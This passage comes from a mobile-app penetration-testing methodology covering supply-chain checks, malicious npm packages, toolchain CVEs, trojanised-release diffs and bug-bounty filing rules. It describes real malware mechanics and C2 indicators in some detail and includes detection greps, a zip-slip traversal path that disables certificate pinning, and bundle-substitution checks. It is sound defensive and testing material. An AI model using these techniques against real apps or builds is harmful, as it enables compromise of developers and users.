| **Maps to** | "abandonment itself constitutes grounds for removal, regardless of CVE status"; Oversecured MavenGate (abandoned libraries are also the MavenGate precondition) |

- **Test:** Libraries whose upstream is archived accumulate unpatched bugs with **no advisory stream**, so
  neither `osv-scanner` nor dependency-check will ever flag them. They are invisible to every tool the
  client runs.
- **How:**
  ```bash
  python3 - <<'PY'
  import subprocess, json, datetime, re
  coords = set()
  for line in open('deps.txt'):
      m = re.search(r'([a-z0-9.]+):([A-Za-z0-9._-]+):', line)
      if m: coords.add((m.group(1), m.group(2)))
  print('coordinates:', len(coords))
  for g, a in sorted(coords):
      url = ('https://search.maven.org/solrsearch/select?'
             'q=g:%%22%s%%22+AND+a:%%22%s%%22&core=gav&rows=1&wt=json' % (g, a))
      try:
          d = json.loads(subprocess.run(['curl','-s',url], capture_output=True, text=True, timeout=20).stdout)
          docs = d['response']['docs']
          if docs:
              ts = datetime.datetime.utcfromtimestamp(docs[0]['timestamp']/1000).date()
              print(g, a, docs[0]['v'], ts)
          else:
              print(g, a, 'NOT-ON-MAVEN-CENTRAL')
      except Exception as e:
          print('ERROR', g, a, repr(e))
  PY
  ```
- **Proof:** A table of coordinates whose newest Maven Central release is years old, paired with an archived
  GitHub repository banner — and, for the exploitable ones, a working PoC.
- **Escalation:** Abandoned **plus** an expired publisher domain is a full MavenGate takeover (D17-063).
  File the demonstrated bug, and use abandonment to argue "no fix is coming; remove or wrap it".
- **Ruled out when:** Every coordinate has a release within a maintenance window the client agrees is
  acceptable, and no repository is archived.

### D17-072 · npm packages with known malicious releases (React Native)

| | |
|---|---|
| **Severity ceiling** | **Critical** — developer/CI compromise leading to source, signing-key and token theft |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) on the build host; scope it correctly, it is not an end-user-device finding |
| **Attacker** | AM-01 against the build host |
| **Applies to** | React Native projects; check both the app repo and every developer/CI host |
| **Maps to** | StepSecurity (2026-03) — compromised `react-native-international-phone-number` **0.11.8, 0.12.1, 0.12.2, 0.12.3** (last safe 0.11.7) and `react-native-country-select` **0.3.91, 0.4.1, 0.4.2** (last safe 0.4.0), with relays `@agnoliaarisian7180/string-argv` (0.3.0, 0.3.1) and `@usebioerhold8733/s-format` (2.0.1–2.0.4); mechanism: wave 1 a `preinstall` hook running an 18.9 KB obfuscated `install.js`, waves 2–3 a three-layer relay ending in a `postinstall` hook launching a 364-byte `child.js` as a detached child; behaviour: a 10-second sandbox-evasion delay, geolocation filtering against Russian/CIS indicators, Solana-blockchain C2 polling against wallet `6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ` across nine RPC endpoints, payload fetch from `http://45.32.150.251` (Vultr, AS20473) decrypted using the `secretkey` and `ivbase64` HTTP headers, in-memory execution via `eval()`/`vm.Script`, and a `~/init.json` 48-hour rate-limit lock. Wiz (2025-06) — 16 React Native / GlueStack packages backdoored with whitespace-obfuscated code; a RAT supporting arbitrary command execution, exfiltration, persistent C2 with version-based server switching, `ss_info` and `ss_ip` commands, dependency installation (`axios`, `socket.io-client`), file upload and shell execution; chain began with `@react-native-aria/focus@0.2.10` on 2025-06-06. OSV tracks malicious packages under the `MAL-` id namespace |

- **Test:** Check the lockfile and the extracted bundle for the specific compromised versions, and the
  developer/CI hosts for the execution artefacts.
- **How:**
  ```bash
  grep -nE '"react-native-international-phone-number"|"react-native-country-select"|@agnoliaarisian7180/string-argv|@usebioerhold8733/s-format|@react-native-aria/focus' \
    package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null
  npm ls react-native-international-phone-number react-native-country-select 2>/dev/null
  ls -l ~/init.json 2>/dev/null && echo "MALWARE EXECUTION MARKER PRESENT"
  find node_modules -name 'child.js' -size -2k -newermt '-365 days' 2>/dev/null
  grep -rn '"preinstall"\|"postinstall"' node_modules/*/package.json node_modules/@*/*/package.json 2>/dev/null | head -40
  grep -rE '45\.32\.150\.251|api\.mainnet-beta\.solana\.com|rpc\.ankr\.com/solana|solana-rpc\.publicnode\.com' /var/log/* 2>/dev/null
  # what actually shipped, independent of the lockfile
  unzip -o target.apk 'assets/*' -d rn
  strings -a rn/assets/index.android.bundle | grep -aoE 'node_modules/(@[a-z0-9._-]+/)?[a-z0-9._-]+' | sort -u | head -100
  strings -a rn/assets/index.android.bundle | grep -aoE '"version":"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u
  ```
- **Proof:** A lockfile pin on one of the named bad versions, the presence of `~/init.json`, or egress logs
  to the named C2. Any package in the shipped bundle but absent from the lockfile is an undeclared
  dependency and a finding in its own right.
- **Escalation:** CI compromise → trojanised signed release. If confirmed, this is an **incident**, not a
  bug — notify the client immediately rather than holding it for the report.
- **Ruled out when:** No lockfile pin matches a known-bad version, no execution marker on any host you were
  authorised to check, and the bundle's package list reconciles with the lockfile.

### D17-073 · Developer-toolchain RCE — scope it as a build-host finding

| | |
|---|---|
| **Severity ceiling** | Critical on a shared or CI network; **not** an end-user-device finding |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) against the build host |
| **Attacker** | AM-01 on the developer/CI network |
| **Applies to** | source-review engagements and any RN/Cordova project |
| **Maps to** | **CVE-2025-11953** — `@react-native-community/cli`, CVSS **9.8**, unauthenticated OS command execution via the development server's `/open-url` endpoint passing unfiltered input to `open()`; affects 4.8.0 through 20.0.0-alpha.2, patched by Meta in **20.0.0**. Also `cordova-plugin-acuant` removed from npm in July 2024 for dropping malicious code at install; **CVE-2023-2507** (CleverTap Cordova Plugin ≤ 2.6.2, unsanitised deeplink → arbitrary JS in the main WebView context) |

- **Test:** The 2025 mobile-tooling RCEs landed on the developer machine, not the device. Report them that
  way; conflating the two in a report is a fast way to lose the reader.
- **How:**
  ```bash
  grep -n '"@react-native-community/cli"' package.json package-lock.json
  npm ls @react-native-community/cli
  lsof -nP -iTCP:8081 -sTCP:LISTEN          # is a Metro/dev server bound beyond loopback?
  grep -rn 'cordova-plugin-' package.json config.xml
  ```
- **Proof:** A pinned CLI version below the patched line **while** a Metro/dev server listens on
  `0.0.0.0:8081`; or an unauthenticated request to `/open-url` executing a command on the developer machine.
- **Escalation:** Dev-host compromise → source and signing-key theft → every user. State that chain
  explicitly, because it is what justifies the severity on a non-user-facing asset.
- **Ruled out when:** The CLI is pinned at or above the patched version, and no dev server binds beyond
  loopback in the documented build process.

### D17-074 · Flutter / Dart pub supply chain

| | |
|---|---|
| **Severity ceiling** | Critical for a confirmed malicious package with a build hook (build-host RCE); High for the Zip Slip in a CI fetching untrusted packages |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Flutter/Dart projects |
| **Maps to** | **CVE-2026-27704** — Dart SDK before **3.11.0** and Flutter SDK before **3.41.0**, Zip Slip during Pub package extraction letting a malicious package archive write outside the Pub-cache destination. The XCSSET incident: the macOS worm infected the `example/` directory of `universal_file_viewer` **0.1.5** on pub.dev (~500 downloads), injecting malicious build hooks into Android Gradle, Xcode and git build files when the maintainer published — with the textbook reachability caveat that "simply adding universal_file_viewer to pubspec.yaml and building an app does not trigger the malware, as the infected files live only inside the example/ directory, which ships in the pub.dev tarball but is never compiled as a dependency". OSV `MAL-` namespace (e.g. `MAL-2024-11812`, `MAL-2025-189`) |

- **Test:** Two distinct issues: a malicious or compromised pub package, and the Zip Slip in the toolchain
  itself. Pub packages can also ship `build_runner` code generators that execute at consumer build time and
  `dart:ffi` native library loads.
- **How:**
  ```bash
  dart --version; flutter --version                 # < 3.11.0 / < 3.41.0 is vulnerable
  grep -A3 '^  [a-z_]*:' pubspec.lock | grep -E 'name:|version:|url:' | head -60
  unzip -o target.apk 'assets/flutter_assets/*' -d fl && ls fl/assets/flutter_assets | head
  unzip -p target.apk assets/flutter_assets/NOTICES* 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
  strings -a lib/*/libapp.so 2>/dev/null | grep -aoE 'package:[a-z0-9_]+/' | sort -u | head -60
  grep -rn "build_runner\|dart:ffi\|DynamicLibrary.open" lib/ pubspec.yaml
  ```
- **Proof:** A `pubspec.lock` entry matching a known-bad package/version, or a package whose tarball
  contains build hooks; for the toolchain issue, the SDK version strings.
- **Escalation:** Build-host compromise → signed malicious release.
- **Ruled out when:** SDK versions are at or above the fixed lines, no lockfile entry matches an OSV `MAL-`
  record, and no dependency declares a build hook or `dart:ffi` load you cannot attribute to a legitimate
  feature.

### D17-075 · Vendored or patched third-party code is unambiguously the vendor's bug

| | |
|---|---|
| **Severity ceiling** | By the behaviour introduced — the point is that it **cannot** be dismissed as "the library does that" |
| **VRT** | whichever node the introduced behaviour lands in |
| **Attacker** | per the behaviour |
| **Applies to** | all, especially apps whose manifest surface is otherwise well-built |
| **Maps to** | the corpus's vendored-patch technique (see also the D10 vendored-WebView-client item); MASWE-0048 |

- **Test:** Compare the bundled library's behaviour against upstream at the same version. A shaded, forked
  or hand-patched dependency is the client's code, whatever the package name says — and this is the single
  most reliable way to find a real bug in an app that has done everything else right.
- **How:**
  ```bash
  # get the upstream artifact at the declared version, then diff the classes that matter
  mkdir up && cd up && curl -sO "https://repo1.maven.org/maven2/<g/path>/<artifact>/<ver>/<artifact>-<ver>.aar"
  unzip -o "<artifact>-<ver>.aar" classes.jar && jadx -d up_src classes.jar
  cd .. && diff -ru up/up_src/sources/<pkg>/ out/sources/<pkg>/ | head -200
  # and look for shading, which hides the provenance entirely
  grep -rn 'shadow\|relocate\|minimizeJar' --include='*.gradle*' .
  ```
- **Proof:** The upstream-versus-shipped diff, with the introduced behaviour highlighted.
- **Escalation:** → whichever domain the patched behaviour lands in; file it against the app, not the
  library.
- **Ruled out when:** Every shipped third-party class is byte-equivalent (after R8 normalisation) to the
  upstream artifact at the declared version for the classes you diffed — name them.

### D17-076 · Trojanised shipped artifact — the release-to-release diff

| | |
|---|---|
| **Severity ceiling** | **Critical** if confirmed — and it is an incident, not a bug |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) / `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) depending on what the implanted code does |
| **Attacker** | AM-08 / AM-01 (compromised build) |
| **Applies to** | all |
| **Maps to** | MASWE-0048 (Malicious Code Included in the App, CWE-506/507/511 — modes: malicious developer, compromised dependencies including typosquatting and hijacked packages, compromised build pipeline, hidden functionality); MASWE-0044; MASWE-0075 (Non-Reproducible Builds); MASTG-TECH-0165; MASTG-TOOL-0009; ATT&CK T1474 (detection framing: apps exhibiting "behavioral changes inconsistent with their historical role post-install or update"); T1474.003; T1661 Application Versioning (S1055 SharkBot: "initially poses as a benign application, then malware is downloaded and executed after an application update") |

- **Test:** Analyse the release build for code, permissions or endpoints nobody intended — the supply-chain
  *outcome* rather than the process. The diff across releases is what makes an implant visible; a single
  build tells you nothing.
- **How:**
  ```bash
  apkid v2.apk                                    # packers/obfuscators that hide the payload
  diff <(aapt2 d permissions v1.apk) <(aapt2 d permissions v2.apk)
  diff <(unzip -l v1.apk | awk '{print $4}') <(unzip -l v2.apk | awk '{print $4}')
  for v in v1 v2; do jadx -d out_$v $v.apk; grep -rIoE 'https?://[^"]+' out_$v/ | sort -u > ep_$v.txt; done
  diff ep_v1.txt ep_v2.txt
  diff <(unzip -p v1.apk AndroidManifest.xml | strings) <(unzip -p v2.apk AndroidManifest.xml | strings)
  adb shell netstat -p | grep $(adb shell pidof com.target.app)
  ```
  Mine the version history rather than only the latest build: a credential removed in build N is frequently
  still live server-side and survives only in build N−3.
- **Proof:** An endpoint, permission or component in the release with no corresponding first-party feature,
  **plus** runtime traffic to it.
- **Escalation:** Report to the programme immediately. Do not batch it with the rest of the findings.
- **Ruled out when:** Every delta across the releases you diffed is attributable to a documented feature —
  say how many releases you diffed.

### D17-077 · Route the SDK finding correctly, or lose it to a duplicate

| | |
|---|---|
| **Severity ceiling** | Varies |
| **VRT** | per the bug |
| **Attacker** | n/a (reporting step) |
| **Applies to** | all |
| **Maps to** | Google Mobile VRP: "If you have identified a vulnerability in an SDK or library used by a first-party Google app (but not developed by Google), please submit it directly to the maintainer … **If multiple reports of the same SDK or library vulnerability are received, even across different apps, they will be considered duplicates of the earliest report submission due to having the same root cause.**" Samsung: third-party code affecting non-Samsung devices is not eligible. Xiaomi: third-party components only when unknown/0-day, first valid submission only. HackerOne Platform Standards require novel third-party bugs to be reported to the component owner before being reported elsewhere |

- **Test:** Determine whether the flaw is in the app's own code or in a third-party SDK **before** filing.
  Check the package namespace of the vulnerable class (`com.<vendor>.*` versus `com.squareup.*`,
  `io.branch.*`, `com.facebook.*`, `com.google.android.play.*`).
- **How:**
  ```bash
  grep -rn '<VulnerableClass>' out/sources/ | head
  # whose namespace is it?
  echo "out/sources/com/vendor/..." | awk -F/ '{print $3"."$4"."$5}'
  ```
- **Proof:** The fully-qualified class name in the report, plus a sentence stating whether the root cause is
  first-party or third-party.
- **Escalation:** This is a duplicate-avoidance rule with teeth: one SDK bug found across twelve apps is
  **one** payout, not twelve. Do not mass-file it. Where the app's *configuration* of the SDK is the defect
  (an over-broad `<paths>`, a missing public key, a permissive flag), that **is** a first-party finding —
  file it as one and say why.
- **Ruled out when:** n/a — this is a routing decision, recorded per finding.

### D17-078 · Run the pre-severity gate against the RCE claim, not against the bug

| | |
|---|---|
| **Severity ceiling** | Support (it governs every Critical in this chapter) |
| **VRT** | n/a |
| **Attacker** | n/a (reporting step) |
| **Applies to** | every Critical/High claim in this domain |
| **Maps to** | the pre-severity gate: five questions asked against the draft Critical *title*, not against the primitive |

- **Test:** This domain produces more overclaimed Criticals than any other, because a write primitive and an
  unsigned channel both *feel* like RCE. Write the draft title, then substitute the Critical claim into each
  question:
  1. Have I validated the FULL chain to attacker-attainable impact, or only one primitive in the middle?
     "Primitive confirmed at layer N" is not exploitable.
  2. What does the attacker walk away with, in one concrete sentence? "Arbitrary code execution in
     `com.target.app`'s process with its `INTERNET`, `READ_CONTACTS` and Keystore access" is concrete;
     "could lead to RCE" is High at best, often Medium.
  3. Have I personally reproduced the full chain end-to-end **at least twice** — once during discovery, once
     for the PoC?
  4. Is there an inheritance gate, signature check, SELinux rule or audience check still gating the chain?
     If yes it is not Critical — document it as "primitive present" at a lower severity.
  5. Has the programme rejected this severity class before?
- **How:** Apply the domain-specific version of Q4 explicitly: did you check
  `setReadOnly()` (D17-010), `checkSignatures` (D17-022), the load-time verification (D17-015), and the
  SELinux `execute` permission (D17-016)? Each of those is an inheritance gate that silently downgrades the
  claim. Also apply the multi-tool bar: reproduce the substitution through two independent paths (e.g. a
  `run-as` write and a provider-traversal write) so the result is not a tooling artefact.
- **Proof:** A documented pass/kill decision per Critical, and reproduction commands in the report that are
  paste-into-shell ready.
- **Escalation:** n/a.
- **Ruled out when:** n/a. And note the inverse rule: **do not retract a confirmed finding that stopped
  reproducing because the client patched mid-engagement.** Keep timestamped pre-patch evidence and say so.

### D17-079 · Chain-filing order — primitives first, consumer second

| | |
|---|---|
| **Severity ceiling** | Support (two payouts instead of one) |
| **VRT** | n/a |
| **Attacker** | n/a (reporting step) |
| **Applies to** | every chain in this domain, which is most of it |
| **Maps to** | the chain-filing rule: one fix equals one bounty; a chain is a **severity amplifier**, not a merge request |

- **Test:** This chapter's findings are almost always chains: a write primitive owned by D07/D08 plus a
  load path owned by D17. They have independent fix surfaces, so they are separate reports.
- **How:**
  1. Identify the highest-severity chained outcome.
  2. File each primitive as its own report at its standalone severity (typically P3/P4) with a placeholder
     cross-reference line.
  3. File the chain consumer with the full RCE narrative at the chained severity, filling in the real
     primitive IDs.
  4. Edit each primitive to backfill the consumer's ID.
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — provider path traversal write (D07)
  - **submission [UUID-2]** — dynamic code load from an unverified path (D17)
  These primitives have independent fix surfaces and are filed separately per the programme's
  "one fix = one bounty" rule.
  ```
  Do not paste the whole chain narrative into every primitive, do not claim each primitive is independently
  P1, and do not ask for a single combined bounty. Do not file everything in one batch within minutes —
  triagers read that as low-effort spam.
- **Proof:** Cross-referenced IDs in both directions.
- **Escalation:** n/a.
- **Ruled out when:** n/a.

### D17-080 · False-positive discipline for substitution proofs

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | every OTA-substitution, bundle-replacement and dependency-sweep claim in this chapter |
| **Maps to** | Marker Discipline; the Body-Diff Rule; the Shell-Loop Ban |

- **Test:** Three specific ways this domain's evidence goes wrong, and the mechanical guard for each.
- **How:**
  - **Marker Discipline.** The string you inject into a substituted bundle must be random, 8+ characters,
    with no English or protocol words — `PWNMARK7f3a91`, not `test`, `evil`, `payload` or `javascript`.
    **Search the baseline (un-substituted) bundle for the marker first.** This single check kills most
    false "my code executed" claims, because Hermes bundles and minified JS contain almost every short
    token you might pick.
    ```bash
    strings -a ext/assets/index.android.bundle | grep -c PWNMARK7f3a91   # must be 0 before you start
    ```
  - **Body-Diff Rule.** "The app accepted my modified bundle" needs a **body** differential in the app's
    behaviour, not a 200 on the update request. A byte-identical UI after your substitution means the app
    did not run your code — it probably fell back to the packaged bundle. Diff the rendered state, and diff
    the on-device bundle's hash before and after.
    ```bash
    diff <(adb exec-out run-as com.target.app cat files/CodePush/<h>/<a>/index.android.bundle | sha256sum) \
         <(sha256sum evil.bundle)
    ```
  - **Shell-Loop Ban.** The MavenGate whois sweep, the abandoned-library sweep and the `.so` version sweep
    all iterate long lists. Shell array loops fail **silently** — a loop can produce zero iterations with no
    error and output that still looks complete. Use Python with per-iteration try/except and **always count
    your results**: if you fed it 180 coordinates and printed 96 lines, the loop ate something.
- **Proof:** The zero-hit baseline grep, the before/after hashes, and a result count matching the input
  count, all in the evidence bundle.
- **Escalation:** n/a.
- **Ruled out when:** n/a — this is the standard, not a test.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "App bundles library X version Y, which has CVE-ZZZZ" | `using_components_with_known_vulnerabilities.outdated_software_version` = **P5**. NVD CPE matching also misflags AndroidX against legacy support-library CVEs. | The three artefacts of D17-060: the symbol present in `classes*.dex`/`lib/`, a caller chain from an attacker-reachable entry point, and a Frida `[REACHED]` log with your input in `args`. Then file it under the **sink's** effect, not under this branch. |
| "App uses `DexClassLoader`" | Loading code is not a vulnerability; loading code from a path someone else can write is. | A writable load path (D17-008/010/011), or a network-sourced artefact with no load-time signature check (D17-015). |
| `play:core` present in the dependency list | The 2.x rewrite (`feature-delivery`, `app-update`, `core-common`) is patched. The corpus's worked negative: `feature-delivery 2.1.0` → **CVE-2020-8913 not applicable**. | The monolith at `< 1.7.2`, confirmed from `META-INF/*.version`, **plus** the broadcast trigger of D17-019 landing a file in `verified-splits`. |
| "`getSerializableExtra` found in the code" | Behind a non-exported component it is not attacker-fed. Deserialization is execution only if you control the ClassLoader contents. | An exported component (quote the manifest line) plus a gadget with an observable side effect (D17-043/044), or a demonstrated state change. |
| "The app deserializes untrusted data" with only a `ClassCastException` | A crash from a malformed Parcelable is `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**. | A gadget side effect, a smuggled object that survives a validation boundary (D17-046/047), or a credential object leaked back to you. |
| "No `gradle/verification-metadata.xml`" | A build-hygiene observation. Most bounty programmes scope the build pipeline out entirely. | A concrete hijackable groupId or an internal coordinate leaking to a public repo (D17-063/064) — the missing control is then the *reason* it is exploitable, not the finding. |
| "An OTA channel exists" | The channel is the precondition, not the bug. | A missing or unenforced signature check (D17-026/027) **and** your bundle executing (D17-017's three bindings). |
| "I disabled the signature check with Frida and my plugin loaded" | On your own rooted device that is AM-12 — not an attack. | Decompiled evidence that the check is not bound to a developer-held key, or that the key travels with the payload (D17-032). |
| "`Runtime.exec` with a concatenated argument" | `exec(String)` is shell-less: it splits on whitespace with no metacharacter shell. At most argument injection. | An explicit `sh -c`/`su -c` with attacker data, or a demonstrated behaviour change in the invoked binary that you can name. |
| "The app is not obfuscated / APKiD found a packer" | Obfuscation state is informational under every bounty rubric. | Capture it only where it materially enabled a demonstrated exploit chain. |
| "Internal package name `com.client.internal.foo` is unclaimed on npm/Maven" | Without build access this is a claimable name, not a demonstrated compromise — and publishing to test it is out of bounds. | Proxy evidence that the build requests that coordinate from a **public** host (D17-064). |
| "CVE-2025-11953 is in `package-lock.json`" | A **developer-machine** RCE, not an app-runtime issue. Conflating them discredits the report. | A dev server bound beyond loopback on a shared/CI network, with the command execution demonstrated (D17-073). |
| "Emulator lets me overwrite the app's DEX with `run-as`" | An environment property of a debuggable build on a rooted emulator; AM-12. | The same write achieved from a zero-permission attacker APK, or via a provider/traversal primitive, on a release build (D17-009). |
| "The app loads code only from its own internal storage" | If nothing else can write there, there is no attacker. | Any injection path that reaches that directory — a provider traversal, a zip slip, a `DISPLAY_NAME` write, a download the attacker controls. |
| "Feature flags are fetched over TLS without a signature" | Unsigned config is a design observation until a flag gates a control. | A flag flip that measurably disables pinning, an auth gate or a root check, captured before and after (D17-037). |
| "The update endpoint returned 400 without a token, so it is unauthenticated" | The layer-ordering trap — a body parser or sanitiser frequently runs in front of auth middleware. | A minimal well-formed `{}` retest returning the operation's real response, with the error taxonomy showing you passed the auth layer (D17-040). |

## Cross-surface joins

- **D07/D08 write primitive × D17 load path.** The join that produces this chapter's P1s and the one almost
  nobody runs: a provider `openFile()` traversal or an `OpenableColumns.DISPLAY_NAME` write is filed as
  "arbitrary file write, High" by the D07 tester, while the D17 tester greps `DexClassLoader` and finds no
  writable path. Neither sees that the write lands in `verified-splits/config.x.apk`, `lib-main/libfoo.so`
  or `files/plugin.dex`. Build the join as an explicit table (D17-009), and file the two halves as separate
  reports with cross-references (D17-079).
- **D17 OTA channel × D02 versionCode/artefact identity.** An OTA bundle changes without the `versionCode`
  moving, so *every other domain's finding* can be stated against bytes that are no longer executing — and
  a "fixed" claim can be true of the store build and false of the live one. D17-006 must run before D02
  records the artefact provenance, or the provenance record is wrong.
- **D17 MavenGate groupId × D18 App Startup auto-initialisation.** A hijacked library that ships an
  `androidx.startup` `Initializer` executes on every cold start with **no first-party call site at all** —
  the shortest possible path from supply chain to runtime, and invisible to any "where is this library
  used?" search. Intersect the release runtime classpath with the `androidx.startup` entries in the merged
  manifest.
- **D17 native `.so` inventory × D16 JNI entry points × D17-059 SBOM.** Maven-coordinate SCA never sees
  `lib/*.so`, so the native half of the supply chain is unscanned **by construction** — and it is the half
  averaging 859 days out of date. The join is: version-fingerprint every `.so` (D17-062), enumerate
  `Java_*` exports, and map each to the app feature that feeds it. That pairing is the reachability
  argument; without it every native CVE is P5.
- **D14 pinning state × D17 OTA signature state.** An unsigned bundle behind TLS is only exploitable with
  the network position D14 establishes, and D14's own analysis changes at **API 34+**, where the trust store
  moved to the Conscrypt APEX and `/system/etc/security/cacerts` is ignored at runtime. Test the two
  together: "unsigned OTA" plus "no pinning, user CAs trusted below targetSdk 24" is a different report from
  "unsigned OTA behind a pinned channel", and only the first reaches AM-06.
- **D05 runtime-registered receivers × D17 deserialization.** The CVE-2020-8913 shape depends on a receiver
  that exists in **no manifest**, so the standard D05 attack-surface enumeration misses it entirely. Pair
  `dumpsys activity broadcasts` taken while the app is foregrounded with the `Parcelable`-sink grep: an
  undeclared receiver reading a `Parcelable` extra is the highest-value combination in either domain.
- **D11 `shared_prefs` × D17 zip slip.** A traversal write does not have to reach code. Landing
  `../shared_prefs/config.xml` with `<boolean name="pinning" value="false"/>` or an entitlement flag flips
  a security decision with no code execution and no SELinux `execute` problem — cheaper than RCE and
  frequently higher-confidence.
- **D21 RASP SDK × D17 remote code loading.** A tamper-detection or anti-fraud SDK that itself fetches
  remote DEX or reflects on server-supplied names is the largest hole in the app it is there to protect,
  and it is the last place anyone looks. Rank reflection density by package (D17-038) and check the security
  vendors first.
- **D23 entitlements × D17 deserialization.** Not every deserialization payoff is code execution. An
  attacker-supplied object graph that flips a subscription, trial or feature flag inside a restored state
  object is a business-logic bypass reachable through the same sink, and it is often the only outcome
  available when no gadget exists.
- **D10 WebView bridge × D17 OTA/live-update.** Injected JS inherits every `@JavascriptInterface` method the
  app exposes. Enumerate the bridge first (D10), because that enumeration is what converts "I changed a
  label in the bundle" into "I read the session token and posted it to my host" — i.e. the difference
  between a demonstration and an impact.

## Sources

- **Local senior-researcher corpus** — `local/skill-corpus-method.md` (the write-primitive → code-load chain
  rule; "verified" in a name is not load-time verification; the executing-artefact rule; OTA code-signing
  triage) and `local/skill-corpus-classes.md` (the D17 class list: file-write→RCE, Play Core, remote code
  bundles and their fail-closed test, the JSON/wrapper gadget with `ParcelableJsonWrapper` and
  `VirtualRefBasePtr`, the deserialization precision rule, the `Runtime.exec` nuance, ZipSlip, MavenGate).
- **Android platform documentation** (via `architecture/aosp-core.md`, `architecture/framework-internals.md`,
  `architecture/security-model.md`) — `about/versions/14/behavior-changes-14` (Safer Dynamic Code Loading,
  `setReadOnly()` before write; Zip Path Traversal mitigation and the
  `dalvik.system.ZipPathValidator.clearCallback()` opt-out); `privacy-and-security/risks/dynamic-code-loading`,
  `…/create-package-context`, `…/unsafe-deserialization`, `…/zip-path-traversal`, `…/insecure-library`,
  `…/xml-external-entities-injection`, `…/path-traversal`, `…/unsafe-uri-loading`, `…/unsafe-download-manager`;
  `guide/app-bundle/play-feature-delivery`; `guide/sdk-extensions`; AOSP `Parcel`/`Bundle` javadoc;
  privacysandbox.google.com SDK Runtime.
- **OWASP MASTG/MASVS** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`) — MASWE-0049, -0050,
  -0044, -0048, -0011, -0043, -0075; MASTG-TEST-0337, -0272, -0274, -0382, -0392, -0034; MASTG-TECH-0012,
  -0029, -0041, -0042, -0129, -0130, -0131, -0165; MASTG-TOOL-0009, -0022, -0130, -0131, -0132, -0134;
  MASTG-KNOW-0004, -0021, -0025, -0042. Noted MASTG gaps: no Android MASTG-TEST covers dynamic code loading
  or XXE.
- **Bugcrowd VRT release 2026-07-08** (`primary/bugcrowd-vrt-severity.md`, `_work_vrt/vrt_full_tree.txt`) —
  the exact node strings and priorities quoted throughout, including the
  `client_side_injection.binary_planting.*` split (P3 default folder / P5 non-default) and
  `insecure_data_transport.executable_download.*` (P4 / P5).
- **Vendor VRP rules** (`primary/vrp-program-economics.md`) — Google Mobile VRP ACE examples and the
  "code within that app itself does not qualify" exclusion; the SDK duplicate rule; Samsung and Xiaomi
  third-party-component policies; Xiaomi rating app-upgrade hijack as LOW.
- **Oversecured research** (via `frontier/undertested-surfaces.md`, `realworld/sdk-supplychain-cves.md`,
  `secondary/writeups-realfinds.md`, `secondary/extra-community-sources.md`) — MavenGate with its full
  statistics; arbitrary code execution via third-party package contexts ("one in every 50 popular apps");
  the Play Core analysis and CVE-2020-8913 timeline; "Why dynamic code loading could be dangerous for your
  apps: a Google example"; TikTok persistent code executions.
- **MITRE ATT&CK Mobile** (`primary/mitre-attack-mobile.md`) — T1407, T1544, T1474/.001/.003, T1626, T1661
  (S1055 SharkBot), T1406.002.
- **Disclosed reports** (`realworld/h1-disclosed-mobile.md`, `secondary/sehno-gowthams.md`,
  `realworld/bugcrowd-intigriti-writeups.md`) — H1 #2516732 (Basecamp), #453791 (PayPal), #1161956,
  #1115864 (Mattermost), #1763343, #1439355; Intigriti Bug Bytes #87 and #128.
- **Cross-platform framework research** (`realworld/crossplatform-frameworks.md`,
  `frontier/modern-api-surfaces.md`) — expo `UpdatesConfiguration.kt` and the code-signing meta-data keys;
  `CodePush.java` / `CodePushConstants.java`; Capacitor `Bridge.java`; Hermes `BytecodeFileHeader.sourceHash`;
  the Android-14-does-not-cover-JS-bundles gap.
- **SDK and dependency CVE research** (`realworld/sdk-supplychain-cves.md`) — Gradle dependency
  verification and GHSA-j6wc-xfg8-jx2j; GHSA-jvmj-rh6q-x395 / CVE-2021-29427; DAGP `buildHealth`;
  CVE-2022-25647 (Gson); the Jackson CVE-criteria wiki; LibScout; LibRARIAN; osv-scanner / cdxgen / syft /
  dependency-track; StepSecurity and Wiz npm incidents; CVE-2025-11953; CVE-2026-27704 and XCSSET.
- **HackTricks and community checklists** (`secondary/hrishikesh-hacktricks.md`,
  `secondary/frida-drozer-tooling.md`, `secondary/indusface-singh-riya.md`, `secondary/sallam-hetmehta.md`)
  — the insecure-in-app-update RCE chain (Xtool AnyScan, NowSecure), in-memory DEX loaders, trusted-updater
  abuse, configuration-driven reflective modules, `Java.enumerateClassLoaders` / `Java.ClassFactory.get`,
  drozer `bytearray`/`parcelable` extras, mobsfscan rule names.
- **Bug-hunting methodology corpus** (`secondary/claude-bughunter.md`) — the shadow/zombie API behavioural
  diff applied to the update endpoint, the layer-ordering trap, Marker Discipline, the Body-Diff Rule, the
  Shell-Loop Ban, the Multi-Tool Reproduction Bar, the Pre-Severity Gate, retraction discipline, and
  chain-filing order.
- **Gap analyses** (`gaps-gap-adversary.md`, `gaps-gap-coverage.md`, `gaps-gap-workflow.md`) — the
  hostile-response pass (attacker model 9 as a method), remote config as an unsigned control plane, the
  executing-artefact re-baseline rule, and the "claim as written vs required to survive" demotion table.
